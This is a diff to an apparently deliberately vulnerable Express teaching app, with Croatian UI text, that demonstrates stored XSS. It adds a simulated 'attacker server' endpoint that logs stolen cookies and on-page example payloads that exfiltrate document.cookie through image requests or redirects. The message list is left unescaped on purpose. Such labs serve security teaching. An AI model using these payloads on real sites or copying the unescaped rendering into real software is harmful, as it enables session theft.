@@ -9,6 +9,15 @@ app.use(cookieParser());
 const baza = { poruke: [], korisnici: [], ukradeniKolacici: [] };
 const postavke = { xssRanjivost: true, sdeRanjivost: true };
 
+function kodiraj(tekst) {
+  return String(tekst)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
 app.post("/xss/poruka", (req, res) => {
   if (req.body.poruka) baza.poruke.push(req.body.poruka);
   res.redirect("/");
@@ -19,21 +28,36 @@ app.post("/xss/obrisi", (req, res) => {
   res.redirect("/");
 });
 
+app.get("/napadac", (req, res) => {
+  const kolacic = req.query.cookie || "";
+  baza.ukradeniKolacici.push({ vrijeme: new Date().toLocaleString("hr-HR"), kolacic });
+  res.send(`<h1>Napadačev poslužitelj</h1>
+<p>Primljeno: ${kodiraj(kolacic)}</p>
+<form method="post" action="/xss/obrisi"><button>Obriši poruke i vrati se</button></form>`);
+});
+
 function sekcijaXss() {
   const poruke = baza.poruke
     .map((p) => `<li>${p}</li>`)
+    .join("");
+  const ukradeni = baza.ukradeniKolacici
+    .map((u) => `<li>${u.vrijeme}: ${kodiraj(u.kolacic)}</li>`)
     .join("");
   return `<section>
 <h2>Cross-site scripting (XSS) – pohranjeni</h2>
 <p class="upute"><b>Upute:</b> Upiši poruku koja se pohranjuje na poslužitelju i prikazuje svim posjetiteljima. Isprobaj:<br>
 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>
-<code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code></p>
+<code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code><br>
+<code>&lt;img src=x onerror="new Image().src='/napadac?cookie='+document.cookie"&gt;</code> (krađa kolačića)<br>
+<code>&lt;script&gt;document.location.href='/napadac?cookie='+document.cookie&lt;/script&gt;</code> (preusmjeravanje)</p>
 <form method="post" action="/xss/poruka">
 Poruka: <input name="poruka" size="60"> <button>Spremi poruku</button>
 </form>
 <form method="post" action="/xss/obrisi"><button>Obriši poruke</button></form>
 <h3>Poruke</h3>
 <ul>${poruke}</ul>
+<h3>Napadačev poslužitelj – ukradeni kolačići</h3>
+<ul>${ukradeni}</ul>
 </section>`;
 }
 
